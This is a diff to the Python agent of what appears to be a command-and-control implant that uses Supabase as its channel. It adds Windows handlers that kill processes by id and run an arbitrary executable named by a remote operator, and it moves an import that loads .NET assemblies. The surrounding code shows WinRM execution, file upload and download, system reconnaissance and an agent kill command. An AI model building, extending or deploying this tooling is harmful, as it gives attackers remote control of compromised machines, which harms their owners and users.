@@ -5,6 +5,7 @@ from .commands import update_command_status, fetch_pending_commands_for_hostname
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
 from .system_info import get_system_info
 from .config import SUPABASE_KEY
+from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
@@ -13,8 +14,8 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.winrm_execute import winrm_execute  # Import the winrm_execute function
     from utils.winapi.pwd import wpwd  # Import the wpwd function
     from utils.winapi.wami import wami  # Import the wami function
-    from utils.winapi.ps import list_processes, grep_processes  # Import ps functions
-    from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
+    from utils.winapi.ps import list_processes, grep_processes, terminate_process  # Import ps functions
+    from utils.winapi.run import run_process  # Import the run function
 
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
@@ -113,6 +114,30 @@ def execute_commands(supabase: Client):
                     result = grep_processes(pattern)
                     status = 'Completed'
                     output = "\n".join(result)
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+
+            # Handle 'ps term' command only if on Windows
+            elif os.name == 'nt' and command_text.lower().startswith('ps term'):
+                try:
+                    process_id = int(command_text.split(' ', 2)[2])  # Expecting command to be in format "ps term [processid]"
+                    result = terminate_process(process_id)
+                    status = 'Completed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+
+            # Handle 'run' command only if on Windows
+            elif os.name == 'nt' and command_text.lower().startswith('run'):
+                try:
+                    executable_path = command_text.split(' ', 1)[1]  # Expecting command to be in format "run [path_to_remote_file]"
+                    result = run_process(executable_path)
+                    status = 'Completed'
+                    output = result
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
